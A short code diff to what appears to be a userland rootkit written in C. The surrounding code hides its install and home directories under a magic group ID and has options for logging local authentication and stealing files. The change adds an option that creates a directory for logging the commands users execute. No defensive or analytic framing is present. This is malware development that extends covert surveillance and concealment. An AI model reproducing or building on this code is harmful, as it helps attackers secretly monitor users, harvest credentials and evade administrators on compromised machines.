@@ -24,6 +24,7 @@ syms symbols[ALL_SIZE];
 #include <libgen.h>
 #include <dlfcn.h>
 #include <link.h>
+#include <sched.h>
 #include <sys/time.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -89,7 +90,10 @@ void plsdomefirst(void){
     preparedir(HOMEDIR, magicgid);
     hidedircontents(HOMEDIR, magicgid);
     hidedircontents(INSTALL_DIR, magicgid);
-#if defined LOG_LOCAL_AUTH
+#ifdef LOG_USER_EXEC
+    preparedir(EXEC_LOGS, magicgid);
+#endif
+#ifdef LOG_LOCAL_AUTH
     prepareregfile(LOG_PATH, magicgid);
 #endif
 #if defined FILE_CLEANSE_TIMER && defined FILE_STEAL
